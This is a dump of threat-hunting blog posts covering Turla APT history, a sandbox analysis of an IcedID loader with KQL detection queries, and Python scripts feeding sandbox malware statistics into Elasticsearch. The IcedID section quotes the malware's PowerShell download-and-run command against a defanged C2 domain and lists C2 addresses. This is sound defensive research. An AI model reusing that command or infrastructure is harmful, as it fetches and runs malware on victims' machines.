in 2014 which they had been analyzing for 10 months before releasing the article. Kaspersky stated that hundreds of computers had been infected in more than 45 countries during the operation. The threat actor was mostly targeting government agencies, research and pharmaceutical companies. The threat actors was using at least two different zero-day exploits in the campaign. The Turla group was using a sophisticated multi-stage attack, beginning with the Epic Turla but it could potentially migrate to their other tooling like the Carbon backdoor. Sometimes there might be multiple backdoor present on a single machine -  if one would be detected and removed the other would remain active. They would deploy rootkit as the persistence mechanism, one likely candidate being the Uroburos/Snake rootkit.  From cyberspace to the actual space: One of the cool and to me mind blowing thing about the activity of the Turla and other APT groups is the use of satellite connection to their C2 infrastructure. Reportedly  the APT groups started to use the satellite connections somewhere around 2007, albeit it used to be very rare at the time. Turla is one of the groups which have used the satellite connections in their operations. The benefit of the satellite connection is that it is hard to pinpoint where the actual server is located. It makes it hard to pinpoint the attack to a group. The receivers can be anywhere in the area covered by the satellite, making it very hard to find the actual device. The originating IP could also be pretty much anywhere in the world.   The satellite connections used to be very expensive. However, Turla and the other groups didn’t really want to pay the price (it would also have an operational risk to the group). The threat actors used the downstream-only internet access which is unencrypted with DVB-s card to hijack the internet connection. The attackers satellite antenna would be pointed to the same satellite with a legitimate connection by some other company and it would listen on the packets from the internet to a specific IP. When a packet would be identified a spoofed reply packet would be sent towards the satellite. It would abuse the fact that the packets to the closed ports would be dropped - instead of sending RST or FIN packet.   It is possible that the Epic Turla operation was also using the Satellites in communicating towards the C2 servers. The initial access tactics which the group was using was based on Spearhishing and watering hole attacks. The Spearphishing included weaponized PDF attachments which were exploiting two different vulnerabilities on the PDF readers. The watering hole attack was using Java, Flash and Internet Explorer exploits. The naming convention in the attachment sent was pointing to NATO, Geneva conference and security protocol amongst other things. It was reported that the attacks were very dynamic, using different methods depending on the availability of the vulnerabilities. The C2 communications were also proxied through several layers which has been a tactic utilized by the group since the start of the operations. 2014 - Breach of the Swiss military firm RUAGThe earliest signs of the Turla being able to breach RUAG are from 2014. However, the report released by the company state that even though the first signs are from 2014 it is not know when they were initially compromised. The proxy logs were not available before September 2014. A quote from their report which I absolutely agree to:  We would like to emphasize that public blaming is never appropriate after such attacks. These attacks may happen to every organization regardless of their security level. What is much more important is to learn from these attacks and to raise the bar for the next time the attacker tries to infiltrate the network. The victim should not be blamed for the attacks. It was not the victims fault that they got attacked - the blame should be on the criminals who were attacking the company. Even if the company is well protected the APT level actors are likely to find a way in to the network - if they want to. This is not to say that there shouldn’t be consequences if even the basic security measures are ignored by the companies.   The first signs of the compromise were found in December 2015, however it was noted that the data was limited and in-depth investigation is not possible. On January 2016 the incident was escalated to a major incident. The investigation lasted for several months but the initial phase was ending at the end of January. After that the investigation continued and new C&amp;C servers were being discovered. The monitoring was improved and it was continued to be improved until the end of April 2016. There were several press reports released on 3. 5. 2016 and according to the report it was damaging the investigation and hindering some of the monitoring to useless. Interestingly, it seems that there were still references to the LOKI2 in the Snake tool which the defenders were analyzing. Remember, the LOKI2 tool was released in 1997, 17 years before of this compromise. The malware is injecting only to common processes known to connect to the internet, likely to fool the local firewall which could block the traffic based on the process name. The persistence was achieved with a Service or a rootkit. Lateral movement was done with named pipes, psexec and WMI. When the threat actor had no use for a particular device anymore, they were removing their own malicious code from the device. At the end of 2014 it was also reported that as opposed as what was believed the Turla had capabilities of attacking other operating systems than Windows. It was reported that the Malware used by Turla had also Linux modules. To me this isn’t really a big surprise at this stage given the history of the APT group.   The operations by the group were started with *nix based malware. The latest capabilities added were using public sources, with the backdoor being based on a backdoor called cd00r. 2016 - Skipper TurlaThe Skipper Turla was another version of the malware created by the Turla group. It was using a newly developed JavaScript payload and shared similarities with older payloads created by the group. The java script payload at this time was developed to avoid detection.   It was also running in parallel with other Turla operations and the researchers believed that this was a specific, targeted campaign. The campaign included the usage of the hijacked satellite connections which were described earlier. The Skipper Turla campaign was focused on targeting embassies and consular operations. It was also shifted targeting additional targets later in 2017. The delivered payload was digitally signed on most of the occasions with the certificate pointing to a company called “Solid Loop Ltd. ”. This was likely a front organization to acquire the certificates for illegitimate purposes. The campaign was relatively short lived and it diminished in June 2017. 2017 - The most active year yetThe APT group was very active in 2017 - or maybe the detection capabilities got better so that their activity was detected better. There was huge amount of activity during the 2017. The group was developing their arsenal by building new malware and improving the older tooling. One reason for this activity likely is that some of their tooling had “burnt”. This means that the defenders could potentially detect the usage of the tools and thus the group might feel like that they need to develop new versions. This likely is true as they are targeting high value targets which often are defended better than the average companies. The Turla group is also known to drop their burnt tooling and create a new version. There was a new version of the tool Carbon, which is one of the many backdoors that the group has created. This was one of the tools which were used in the attack against RUAG. Swiss GovCERT. ch had analyzed the version of the Carbon which was used in the attack. They published a research document about the attack and thus the tool was recognized by the public. It had similarities to Uroboros rootkit and could be seen as a lite version of the Uroboros. The group had developed another tool. This time they were using a tool called Gazer, which is yet another backdoor. The malware was spotted from the European embassy and ministry systems. The malware received encrypted commands and it can launch the commands either locally or it can target remote devices. The malware uses virtual file system in device registry to avoid being detected. The Snake malware was also being ported to the OS X. The Mac version of the malware was delivered as a fake Adobe Flash installer and it was digitally signed with Apple developer certificate. The certificate was revoked by Apple but it is likely that the Turla group was not really affected by this. The group is so resourceful that they likely did quickly discover another way. They were also targeting the G20 task force participants. To do so they had developed yet another tool - this time it was a . NET based dropper. This was likely delivered to the participants but also to other parties interested in the event. They also had updated many of their other malware during 2017. It should also be noted that the group was using more generic tools. They had initiated the operation Mosquito Turla  in which Metasploit was used before dropping the groups own malware. This is quite interesting as normally it seems that they are more found in using their own stuff. The most vicious act of the group in 2017 was to use Britney Spears’ Instagram account to point their malware to the C2 server. The group was commenting on a  picture posted by the POP star which contained a hidden link to find the C2 server address. Amazing tactic to avoid being detected with the normal means, as the implant would connect to Instagram instead of the actual C2 address. I officially continue to be amazed. 2019 - Powershell and Iranian APTsThe group had already used Powershell before, the Posh-SecModule for example. It had it’s fair share of problems which is why the Turla group likely developed their own improved versions of the Powershell tooling. The Powershell loader created by the group used two different persistence methods, one being the Powershell profiles and the second one was WMI based persistence. The malware was capable of bypassing AMSI, using the technique presented in Black Hat Asia 2018. They were using a Powershell backdoor known as Powerstallion. This is a backdoor which received it’s command through Onedrive or other cloud storage instead of an actual C2 server. This was quite early usage of this technique, during 2022 the threat actors were reported of increasingly using similar techniques. This is hard to detect as the beacons are connecting to a legitimate cloud service. The Powershell malware contained the option for RPC backdoor. This would work in a client-server manner so that the threat actor could give out commands to the clients using the central server. This central server likely was one of the initially accessed devices from which the threat actor was laterally moving to other devices within the internal network. The Turla group was able to compromise the infrastructure of Iranian APT group. Apparently the Turla group used compromised credentials to access the infrastructure. While at it Turla stole some of the tools which the Iranian group had developed. Using the gained access they gained access to different systems in Middle East. 2020sThe same trends continue in 2020s. The group is developing it’s own capabilities sometimes loaning from the public sources. At the end of 2020 there was a huge breach against SolarWinds. This is a company offering system management tools and it is being widely used by different organizations. SolarWinds are offering their services to major companies, including Fortune 500 companies and US government agencies. The hack was targeting one of the tools of the company known as SolarWinds Orion. The threat actor was able to infiltrate the SolarWinds environment injecting a backdoor to the Orion which was then pushed to the customer environments. This was a Supply Chain attack. The result was that most of the companies utilizing the Orion software were updating their software to a version which included a backdoor, giving access to the attacker.   The threat actor gained access to the SolarWinds networks in 2019 after which they had developed custom code and injected it into the Orion. The malicious code was called Sunburst. The malicious update delivery started in March 2020. The attack has been attributed by many researchers towards Russian government sponsored hackers. It is still unclear which group was behind the attack. However, it is clear that the backdoor was sharing some of it’s features with one of the tools developed by the Turla group, Kazuar. The similarities with the Sunburst and Kazuar included couple of different algorithms and the extensive usage of the FNV-1a hash. It is possible that the Turla group was heavily involved in the Sunburst attack, however the similarities in the code are not proving that to be the case. It is possible that the malware developers would have, for example, sold similar malware to different entities. In 2022 the Turla group registered C2 domains of commodity Malware Andromeda. The C2 domains were expired, likely because it is very old piece of Malware. The malware used to be active in the early 2010s and had been a minor threat recently. The malware was delivered through infected USB drive and in this occasion the malware infected a device in Ukraine. The Turla group gained access to the device by registering the C2 domains and then pushing their own malware through the C2 connection. After infecting the device with their own malware the normal operations continued by the group. It is very likely that the Turla group has been targeting their efforts towards Ukraine as of late as Russia is attacking the country. It was announced in June 2022 that Turla group would be used as the basis of the next round of the Mitre Engenuity evaluation. This is Mitre’s own evaluation of the endpoint security tooling on which they give no scores to the products. To make the data useful you need to analyze the actual results. It is possible to look at the stats generated by others but these are quite often published by the tool vendors and they are trying to find a suitable angle to highlight their own product. This is all fair but to take full advantage of the hard word at Mitre you probably want to analyze the results yourself. The latest news are part of the reason why I started to write this post: FBI announced that they were able to dismantle the Snake malware. This malware is one of the oldest and fanciest tools in the arsenal of the group. This is the rootkit, also known as Uroburos -  a snake eating it’s own tail. FBI developed a tool called Perseus to battle the Uroburos. The creation was started by creating a tool which was capable of detecting the network traffic by the Uroburos tool. FBI was able to pinpoint 8 infected devices within United States - asked permission to remotely access the devices - and then monitored the malware for years. They were able to detect other victims and to impersonate the Turla group. They were also able to give commands to the Snake malware. Then with the court permission they gave a destructive command to the malware which overwrote the vital parts of the malware, removing it and also hindering the Turla group in-able to access the implants anymore. The Turla group is known of using backup backdoors and the FBI was only targeting the Snake so it is possible, or even likely, that the threat actor still has access to the devices. At least some of them. Still, I find this extremely impressive. A great ending for the story too. Threat hunting the APT groupsI am not sure what to write here. The tactics of the group have been so sophisticated that it is hard to think of what to hunt for. The tactics that the group use are ever changing and if their tooling gets burned they develop a new one. I do also think that most of the defenders do not face APT groups very often, if ever. Nevertheless, the modern financially motivated groups use similar tactics and I think that the gap between of the APT groups and other actors isn’t as big as it used to be. There have been more and more news where the APT groups have actually used a public PoC code to exploit commonly known vulnerabilities too. This time I will not create any queries, rather I add some ideas which I have that can be turned into hunting rules. General ideas, more or less.  While going through the historical articles there have been some similarities with the malware developed by Turla. For example, they were running similar discovery commands. These commands could be used as the basis of a rule - hunt for the commands being launched in a short interval.   I wrote a blog post of this subject before (Running multiple instances of discovery commands in short period of time - Threat hunting with hints of incident response) but do keep in mind that this is not useful out of the box. It needs a lot of tuning. It can provide some insight how this kind of hunt can be done.  Rundll32/regsvr32 based hunting. These were some of the techniques which were present with many of the attacks launched by the Turla group. They are used a lot by the financial groups and as such they are amazing target for threat hunting or detection rules.  Hunting for C2 communication towards known cloud services. During the investigation I noted that the Turla group used Instagram, Onedrive and other cloud storage options for giving out commands to the malware. Hunting for abnormal connections towards these can prove to be valuable.  ICMP based C2 connections. The Turla group has utilized ICMP based connections since the start - they started this already in 1996 with the malware based on the Loki2 tool and apparently they have been utilizing similar backdoor even in the 2020s.  Hunting for 0days can be quite hard as you don’t really know what you are looking for. However hunting for recently (in the past 6 months) released exploits is possible and advisable. I have to say though that the older vulnerabilities are actually used a lot more than the recent ones. It can prove to be valuable to hunt for exploiting the older major vulnerabilities especially if you know that for some reason they have not been patched.  As stated hunting for 0day exploits can be hard. One idea to tackle this would be to hunt for rare processes spawning processes often utilized by the threat actors. These processes could include cmd. exe, powershell. exe, rundll32. exe, regsvr32. exe and many many others. This can be a little hard and requires baselining the processes which are normally launching these processes in your environment though.  Notice the absence of Persistence techniques? I love hunting for persistence and Turla did use service based persistence with some of it’s malware. That can be hunted. However, they also did use a lot of rootkits. I do not really know how you would threat hunt rootkits with endpoint based solutions.  ConclusionThis post has been fun to write. I’ve dwell deep into the history of the Turla group, hopefully bringing a high-level histogram of the group in enjoyable format for the reader. I learned a ton of the history of the group and was absolutely amazed of the techniques that the APT group has been using during the years of being active. The ability to adapt to the situation and willingness to ditch burned infrastructure is jaw dropping. In reality most of my work has been done against the financially motivated actors which are not acting usually with much any finesse so this is just next level. I knew that APT groups do have much more sophisticated means to attack but this was eye opening research towards the Turla group and APT in general. The data which I’ve gone through has also emphasized it once more how little I know. The amazing articles, write-ups, malware analysis and case reports from truly talented people is just mind blowing. It has been a great pleasure to go through the material, albeit I have had sometimes issues in understanding especially the highly complex reverse engineering reports. The post is based on highly valuated work of others. All the resources from which I have gathered information are added below. The write-up includes the events which I found particularly interesting but could miss some major activity by the Turla group. I did use quite a lot of time to do my research towards the group but it is likely that I have missed many things which could be included. ReferencesIn no particular order.  https://www. industrialcybersecuritypulse. com/threats-vulnerabilities/throwback-attack-russian-apt-group-turla-has-hit-45-countries-since-2004/ https://attack. mitre. org/groups/G0010/ https://securelist. com/the-epic-turla-operation/65545/ https://exatrack. com/public/Tricephalic_Hellkeeper. pdf https://www. welivesecurity. com/wp-content/uploads/2020/05/ESET_Turla_ComRAT. pdf https://www. cfr. org/cyber-operations/agentbtz https://www. latimes. com/archives/la-xpm-2008-nov-28-na-cyberattack28-story. html https://paper. bobylive. com/Security/APT_Report/A_Threat_Actor_Encyclopedia. pdf https://www. kaspersky. com/blog/moonlight-maze-the-lessons/6713/ https://dmfrsecurity. com/2022/01/15/100-days-of-yara-day-27-loki2/ http://phrack. org/issues/49/6. html http://phrack. org/issues/51/6. html https://securelist. com/penquins-moonlit-maze/77883/ https://securelist. com/agent-btz-a-source-of-inspiration/58551/ http://blog. threatexpert. com/2008/11/agentbtz-threat-that-hit-pentagon. html https://www. mtvuutiset. fi/artikkeli/mtv3-suomen-ulkoministerio-laajan-verkkovakoilun-kohteena-vuosia/2369718 https://securelist. com/satellite-turla-apt-command-and-control-in-the-sky/72081/ https://media. kasperskycontenthub. com/wp-content/uploads/sites/43/2014/08/20082353/GData_Uroburos_RedPaper_EN_v1. pdf https://www. govcert. ch/downloads/whitepapers/Report_Ruag-Espionage-Case. pdf https://www. telsy. com/following-the-turlas-skipper-over-the-ocean-of-cyber-operations/ https://yle. fi/a/3-8591548 https://www. welivesecurity. com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/ https://cyberscoop. com/gazer-backdoor-turla-eset-2017/ https://blogs. blackberry. com/en/2017/06/this-week-in-security-6-09-2017 https://www. proofpoint. com/us/threat-insight/post/turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack https://www. welivesecurity. com/2018/05/22/turla-mosquito-shift-towards-generic-tools/ https://www. welivesecurity. com/2019/05/29/turla-powershell-usage/ https://www. theregister. com/2019/10/21/british_spies_russia_faking_iranian_hack/ https://www. mandiant. com/resources/blog/turla-galaxy-opportunity https://techcrunch. com/2023/05/10/turla-snake-malware-network-russia-fsb/ https://securelist. com/sunburst-backdoor-kazuar/99981/"
    }, {
    "id": 30,
    "url": "https://threathunt.blog/analysis-of-the-current-malware-icedid/",
    "title": "Analysis of the current malware - Icedid",
    "body": "2023/03/19 - Making the decision of what to analyzeThe last blog post that I wrote was about creating an ELK with a Kibana view of the currently active malware, using the common publicly available sandbox services. This gives some insight of what is currently active and I think it can be quite current as I believe that quite a lot of people are uploading the malware they come across to the sandboxes. What I have gathered so far is that probably 95% of all the malware is related to info stealers and that it is a damn shame that I think this can’t be done with VirusTotal as I am sure that that would give much better insight. The picture to the left shows the most active malware families from the past 7 days according to the Hatching Triage. This shows that redline and amadey continues to be the most commonly uploaded samples, by a far margin.   These both are info stealers, trying to gain access to different kind of information stored on the target devices. SmokeLoader is known to load Amadey which is likely why it is so high up in the results here.   From the rest, Vidar, AgentTesla, Rhadamanthys and Laplas are also info stealers. Glupteba is a botnet, which can drop whatever else - including the said info stealers. Interesting exception to the bunch here is Djvu. This is a Ransomware - although it is a little different from most known Ransomware families. Djvu is only targeting the single machine, so no fancy lateral movement or infecting hundreds or thousands of devices before launching the disastrous encryptor. For me, this makes it a little boring - unfortunately. The data from the Malware Bazaar isn’t identical. Mirai is by far the most uploaded sample in Malware Bazaar when looking at the past 7 days. This is a change, when I originally created the ELK dashboars Mirai was far behind of Redline and Amadey in Malware Bazaar too. Otherwise, there are minor differences - Malware Bazaar has more botnets in the top families but mostly info stealers too. As I am not really interested in analyzing info stealers I filtered out the biggest families. This revealed, from the past two days, that Emotet has been still most active, followed by Asyncrat. I have already ran one sample of Asyncrat little while ago and thus not interested in that. Emotet, to my knowledge, hasn’t got any new tricks - except that it has now adopted the OneNote delivery method. Icedid pops out, which raises my interest likely most out of all of the samples here. I’ve been working with loaders quite a lot lately but I still find them interesting from threat hunting perspective as they are often the first thing that can be realistically spotted from the endpoints. Icedid has been tied with Raspberry Robin and has also been noted of being either the first or second stage payload. Let’s go with Icedid then. Icedid, recent sample Sysmon analysisI chose to go with this sample as it is quite recent so the C2 is still hopefully operational. The file contained a Javascript file which when launched didn’t show anything visible. After I double clicked it, the javascript file was executed with wscript. exe, which is the first great hunting vector. Then, it launched encoded powershell through cmd. exe. The powershell process was launched with the following commandline IEX (New-Object Net. Webclient). downloadstring (“http://conalom[. ]top/gatef1. php”).   So basically, it is loading the next payload from the remote Address. After this the PowerShell process initiated a connection to IP 176[. ]124. 193. 25. After initiating the network connection the PowerShell process start a new process, rundll32. exe, with the following Commandline: “C:\Windows\System32\rundll32. exe” C:\Users\VAGRAN~1. WIN\AppData\Local\Temp\BPLTjzsS. dat,init. File creation for the file BPLTjzsS. dat is not recorded for some reason. It is present on the disk, with SHA256 hash 9E66B2A30D5244D1DFFB968CC1C67FE705CE208EED450AE81F9F48552187749B and has been reported as malicious in many VT engines. This is associated to Iceid, as to be expected. The PowerShell session queries for the domain conalom. top, which results in IP 176[. ]124. 193. 25. The PowerShell process initiated a connection to this IP on port 80 afterwards. Next, the malicious rundll32. exe process queries for the domain umoxlopator. com, which results to IP 80[. ]78. 24. 30 to which the rundll32 process initiates a connection to on port 80. Even after waiting for a good few hours, nothing else is being done. The malware has an active C2 connection towards the latter IP-address but hasn’t done anything - not even the usual Discovery commands. Weird, but ok - it is waiting for manual action from the threat actor. They might be having a nice Sunday dinner - or maybe they have a bigger catch to fry. Interestingly, the C2 connection is quite spammy, connecting to the address every minute or so. Hunting for Icedid: I thought that I would have already created queries to account for this behavior but it actually seems that I have not. Let’s start with easy. This basically looks for wscript. exe or cscript. exe starting cmd. exe which then starts encoded Powershell. The regex is not mine, it is from the Microsoft Repository, here. sysmon| where Image endswith  cmd. exe | where ParentImage endswith  wscript. exe  or ParentImage endswith  cscript. exe | where CommandLine matches regex @'(\s+-((?i)encod?e?d?c?o?m?m?a?n?d?|e|en|enc|ec)\s). *([A-Za-z0-9+/]{50,}[=]{0,2})'| project TimeGenerated, Computer, ParentImage, Image, CommandLine, CurrentDirectoryNext, let’s look for the network connection made by the PowerShell process. sysmon| where EventID == 1| where Image endswith  powershell. exe | where CommandLine matches regex @'(\s+-((?i)encod?e?d?c?o?m?m?a?n?d?|e|en|enc|ec)\s). *([A-Za-z0-9+/]{50,}[=]{0,2})'| project ProcessCreateTime = TimeGenerated, Computer, ParentImage, Image, CommandLine, ProcessId| join (sysmon| where EventID == 3| where Image endswith  powershell. exe | project NetConTime = TimeGenerated, Computer, Image, ProcessId, SourceIp, DestinationIp, DestinationPort, DestinationPortName, DestinationHostname) on ProcessId, Computer| project-away Computer1, Image1, ProcessId1As we all like joining data I added one final join before I end the post. It adds the child process created by the powershell. exe to the mix - the powershell. exe needs to make a network connection and it has to spawn a child process for this to fire. So it is starting to be quite granular. sysmon| where EventID == 1| where Image endswith  powershell. exe | where CommandLine matches regex @'(\s+-((?i)encod?e?d?c?o?m?m?a?n?d?|e|en|enc|ec)\s). *([A-Za-z0-9+/]{50,}[=]{0,2})'| project ProcessCreateTime = TimeGenerated, Computer, ParentImage, Image, CommandLine, ProcessId| join (sysmon| where EventID == 3| where Image endswith  powershell. exe | project NetConTime = TimeGenerated, Computer, Image, ProcessId, SourceIp, DestinationIp, DestinationPort, DestinationPortName, DestinationHostname, PowerShellID = ProcessId) on ProcessId, Computer| project-away Computer1, Image1, ProcessId1| join (sysmon| where EventID == 1| where ParentImage endswith  powershell. exe | project ChildProcessTime = TimeGenerated, Computer, ChildProcessImage = Image, ChildProcessCommandLine = CommandLine, ChildProcessId = ProcessId, PowerShellID = ParentProcessId) on PowerShellID, Computer| project-away PowerShellID1There are a ton of other options here too but this is it now. The C2 would have been interesting to hunt for based on the frequency - maybe next time. This post took ages to make already, for the wrong reasons that are found from the conclusion part. ConclusionUnfortunately, I had huge issues with DetectionLab this time. The ansible tasks were getting stuck and failing in the end and I was tackling many of the issues while writing this blog post. I have no idea why random tasks were failing as this has worked perfectly fine for a while now - but it took hours, debugging and retrying so it wasn’t amazing experience. As the project has been discontinued I might be building something of my own - probably based on the great work that has been done to DetectionLab. If I will do that I might be blogging about that later and sharing the work to others - however if I will build something it will likely be much more crude and simplistic as the whole DetectionLab is a little overkill for me. I already removed many components while debugging, like the network level detection (Suricata/Zeek). Also - it will likely be built upon Unraid - which uses KVM-QEMU-Libvirt in the background. I am not overly (at all) familiar with most of the tools used so it will be a huge project to learn - I like it - but I am not sure IF/when I would have the time to do it. What comes to Icedid - I didn’t really see anything new or exciting of the activity. Old tricks that have been seen multiple times and can be found with low effort queries. It is highly likely that even this sample which was uploaded to Hatching Triage a day before I launched it would have been already picked up by most of the Antivirus software. However the reality is that these do get past the controls. This is the reason why you most likely would like to do some threat hunting and targeting the malware. As you’ve likely noted - I like hunting for loaders. The reason for this is that I like to launch them in the lab to observe where they take me. This time - it didn’t really take me to a journey. Maybe that would have happened later but I decided to restore the snapshot around 8 hours after I launched the Icedid. Queries available at Github for easy copying. "
    }, {
    "id": 31,
    "url": "https://threathunt.blog/malware-statistics-to-elk/",
    "title": "Malware statistics to ELK",
    "body": "2023/02/16 - I’ve been somewhat busy lately and hadn’t had much time to write anything to the blog unfortunately. I also have had some issues in thinking of good topics as I don’t want to get stuck in running similar topics each time. I’ve been dealing with running different samples for couple of posts in a row so I though of something that would maybe make my life easier in the future; how about creating statistics of the malware that is currently being active? My idea was to use all the data available over the sandbox services. I really don’t want to pay for the access so I first looked at tria. ge. This requires you to get access to the API as a researcher, which I requested but haven’t received at least yet. So I parked that for now. I started to look for other solutions (I’d like to have multiple anyway) and stumbled across abuse. ch. I also noted that they have done this work for me already in Malware Bazaar. :) So they have statistics already available here. There were somethings that could be improved, like setting the actual times from which you want to look the data from. Because of that, I still decided to go forward with the idea. Malware bazaarAbuse. ch has a free to use API which can be used to pull data from the past hour, amongst other things.   So, I created a quick python script to do achieve this, pushing the data to local ELK: from datetime import datetimeimport urllib. requestimport urllib. parseimport jsonfrom elasticsearch import Elasticsearches = Elasticsearch( http://ES_host:9200 )data = urllib. parse. urlencode({'query': 'get_recent', 'selector': 'time'}). encode()req = urllib. request. Request('https://mb-api. abuse. ch/api/v1/', data)response = urllib. request. urlopen(req)jsonResponse = json. loads(response. read())for r in jsonResponse[ data ]:  r[ timestamp ] = datetime. now()  resp=es. index(index='mw_bazaar',document=r)  print(resp['result'])This is super simple. Works fine but I did add the timestamp so that gets indexed without much trouble. I wanted for the timestamp to be the ingestion time of the document so by adding the value to the dict does fine. Probably could be more fine-tuned though. I created a docker image of this with a crontab that I ran on my unraid host. I did follow this, however I reworked it quite a bit. Nothing fancy though, mostly installing the required python modules from a txt file and otherwise the logic is the same. I scheduled the script to run once a hour as it should pull the data from the last 60 minutes. Now that I have some data flowing in I probably want to do some nice visualizations with Kibana to read the statistics - before moving on to the next data integration. The data that is flowing in from Malware Bazaar is quite simple so the visualization I created took all the 12 seconds to create with Kibana.  This is simple but as the Kibana offers the easy filtering and all it is quite effective. The data and the percentage of the tags &amp; signature are showed nicely - tags on the left and signature on the right. If more details are needed those can be seen from the discover (table) below but it is quite lacking as there isn’t a ton of information there. This is still looking fine for my usage and the only issue is that it does only have the Malware Bazaar as a source. I’d rather have more data. Looking at the VirusTotal, I think that I have no possibility to use the API to pull the stats from there, which is a shame. I did notice that Hybrid-Analysis allows for pulling data though. Hybrid analysisLooking at the API documentation it says that I can pull the last 250 reports. No actual times are given so if this would be critical I would need to create a duplication check to the script. However, as this just is something for my personal usage I didn’t really bother. I just scheduled the thing to run every 5 hours. The actual code is here. You need to provide the ES server 0nce again and your API key for hybrid-analysis and otherwise it works pretty much the same as the Malware Bazaar script. I am pushing the data to a different index because the data is looking completely different. import urllib. requestimport urllib. parseimport jsonfrom datetime import datetimefrom elasticsearch import Elasticsearches = Elasticsearch( http://ES_host:9200 )req = urllib. request. Request('https://www. hybrid-analysis. com/api/v2/feed/latest')req. add_header('api-key', 'your_api_key')req. add_header('user-agent', 'Falcon Sandbox')response = urllib. request. urlopen(req)jsonResponse = json. loads(response. read())for r in jsonResponse[ data ]:  r[ timestamp ] = datetime. now()  resp=es. index(index='hybrid_analysis',document=r)  print(resp['result'])I added this to the Crontab file as a secondary job. I am running it every 5th hour. Then I created some visualizations, once again them being extremely simple. There are further possibilities, however the data isn’t really perfect for my usage.  The tags for the samples are very generic at least for the current data that I have. I removed quite some generic data with filters to get something potentially meaningful from the data. Unfortunately, it ain’t much at least yet. :( Nevertheless the actual information stored for each submitted file is much better with hybrid-analysis. You get a lot of different meaningful details which is great. This solution does not really help with my idea of getting a whiff of what are the currently active loaders for example though. So although this is very interesting data it doesn’t yet solve my problem. However, it could be that this data is enriched to be a little bit better when more data flows in from the hybrid-analysis. I don’t really think that it will be much better though so I am looking for further solutions too. Continuing the experiment - Hatching TriageI got access to Hatching Triage API as I was given the research permissions. Thanks to Recorded Future for granting me with the researcher access to the Hatching triage &lt;3. I started to look into implementing the Hatching Triage data to the ELK Dashboard after I got the access. Unfortunately, I came across couple of problems while at it. The first issue that I noted is that when using the search function on the API it does only return very general metadata of the samples. The API do not list the tags that have been observed with the sample - only much more limited data. So I had to loop through all the results and query the rest of the information with another API call. This means that there would be quite a few API calls made towards the API, but unfortunately I couldn’t think of any other solution. The second problem that I did encounter was that the search function resulted a maximum of 50 results. First, I though this was because of pagination but increasing the results to maximum of 200 didn’t help. Or I failed miserably in using it. I didn’t play too much with it as in the end as getting more results from the first API call wouldn’t really affect the number of API calls too much - most of the API calls come from the individual sample checking. So I basically was experimenting with this and noted that I would need to run the script every 20 minutes to not get over 50 results. Also, I needed to do some tinkering to only to get the data which I want to ELK. So I created a new dict to which I was adding only the fields that I want from the returned API calls for each of the samples. I also created a bit of an error checking to this as I am looping through each of the returned samples. I might continue this in a way which is actually pushing those error messages to ELK too, however for now this will do. import urllib. requestimport urllib. parseimport jsonfrom datetime import datetime, timedeltafrom elasticsearch import Elasticsearches = Elasticsearch( http://your_elk_server:9200 )# Get the current UTC time and extract 20 minutes from itd = datetime. utcnow() - timedelta(minutes=20)# From date filter as a stringfromdate = str(d. strftime( %Y-%m-%dT%H:%M:%S ))req = urllib. request. Request(f'https://tria. ge/api/v0/search?query=from:{fromdate}')req. add_header('Authorization', 'Bearer &lt;your-api-key&gt;')response = urllib. request. urlopen(req)jsonResponse = json. loads(response. read())# Loop through the samples listed from the first API requestfor r in jsonResponse[ data ]:  req = urllib. request. Request(f'https://tria. ge/api/v0/samples/{r[ id ]}/summary')  req. add_header('Authorization', 'Bearer &lt;your-api-key&gt;')  resp = urllib. request. urlopen(req)  jsonResp = json. loads(resp. read())  # Try to push the data to ELK  try:    # Create a new document to push to elk, with relevant data    doc = {      'created': jsonResp[ created ],      'completed': jsonResp[ completed ],      'sample': jsonResp[ sample ],      'score': jsonResp[ score ],      'sha256': jsonResp[ sha256 ],      'target': jsonResp[ target ],    }    # Push behavioral1 metadata if available    if f'{jsonResp[ sample ]}-behavioral1' in jsonResp[ tasks ]:      doc[ behavioral1 ] = jsonResp[ tasks ][f'{jsonResp[ sample ]}-behavioral1']    # Push behavioral2 metadata if available    if f'{jsonResp[ sample ]}-behavioral2' in jsonResp[ tasks ]:      doc[ behavioral2 ] = jsonResp[ tasks ][f'{jsonResp[ sample ]}-behavioral2']    # Push static1 metadata if available    if f'{jsonResp[ sample ]}-static1' in jsonResp[ tasks ]:      doc[ static1 ] = jsonResp[ tasks ][f'{jsonResp[ sample ]}-static1']    resp=es. index(index='triage',document=doc)    print(resp['result'])  except:    print( Error in pushing data )This results in a ton of API calls each day. I was trying to find the limits from the Hatching Triage documentation, however I was not able to do so. I wouldn’t be too surprised if this results in hitting some sort of API limit though. Hopefully though, I am not breaking any rules or anything - I really don’t want to lose the researcher permissions. :) Here is my first visualizations, mostly targeting the malware families. The treemap visualization is all the families, upper pie chart is loaders and the bottom one info stealers. As you can see it is far from perfect; the tags field contain multiple tags and the family is not always tagged for the loaders, for example. I modified the visuals so that only the family tags are shown here but it needs a lot more work to be usable. However, it already is giving me a ton of information.  VisualizationsThe visualization that I have created for all the three data sources are looking okay but the dashboard starts to be a little cluttered. I decided to move all the three sources to different dashboards, linking them with navigational menu. I have done the nav bar before many times on Kibana, however this time I was trying to see if it can be more visual than a simple Markdown based menu. I came across an article which described how to create a nav bar using TSVB visualization which looks a lot better than a simple MD based nav bar. I was also fine-tuning and looking for better filters for the current visualization which I had, which revealed that the Hatching Triage really is the best data source of the three for my usage. It allows for (most easiest) way to filter and visualize only the family of the malware rather than high level groups like “generic trojan”. Also I added a timeline to the Hatching Triage dashboard to show the activity of the families in a timeline manner.  The timeline doesn’t work that nicely as a picture but with the interactive mode in Kibana you can hover your mouse over a period in the timeline to see the most active families from that period, which is VERY nice. I absolutely love this visualization myself and will likely be using it quite a lot in the future. As I stated, I created three different dashboards with nav menu to navigate through them. Here is a GIF which quickly shows the dashboards.  I am starting to be somewhat happy with these! Conclusion #3Currently this allows me to take a look at the statistics from two three different engines. All of these provide different kind of view to the malicious file which have been updated to the services. All of them prove value to me - the Hatching Triage especially is amazing. It provides me (when more data flows in) a great look into different currently active malware families which was the whole point! Amazingly amazing. The visualizations are looking quite nice too now. I like them quite a lot and might be sharing the export of the Kibana objects later on. I am not sure if they can be used only by importing so I also might NOT be sharing them. I will likely still be working with the visualizations - I love tinkering with them.  I created a fork of the GitHub repo with the changes that I made to the code(s). The same fork has the Python scripts. It is available here "
    }, {
    "id": 32,
    "url": "https://threathunt.blog/hunting-for-msbuild-based-execution/",
    "title": "Hunting for msbuild based execution",
